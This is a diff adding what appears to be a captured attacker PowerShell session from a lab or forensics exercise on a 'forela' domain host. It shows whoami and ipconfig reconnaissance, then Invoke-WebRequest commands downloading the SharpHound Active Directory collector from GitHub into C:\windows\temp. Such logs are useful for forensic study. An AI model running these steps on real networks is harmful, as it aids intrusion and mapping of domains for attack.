@@ -1,0 +1,27 @@
+whoami
+
+forela\happy.grunwald
+PS C:\WINDOWS\system32\WindowsPowerShell\v1.0> 
+ifconfig
+
+PS C:\WINDOWS\system32\WindowsPowerShell\v1.0> 
+ipconfig
+
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : localdomain
+   Link-local IPv6 Address . . . . . : fe80::3340:25bd:64b:dcf3%6
+   IPv4 Address. . . . . . . . . . . : 172.17.79.129
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.17.79.2
+PS C:\WINDOWS\system32\WindowsPowerShell\v1.0> 
+Invoke-Webrequest -URI https://raw.githubusercontent.com/BloodHoundAD/BloodHound
+
+PS C:\WINDOWS\system32\WindowsPowerShell\v1.0> 
+Invoke-Webrequest -URI "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Collectors/SharpHound.ps1" -OutFile C:\windows\temp
+
+
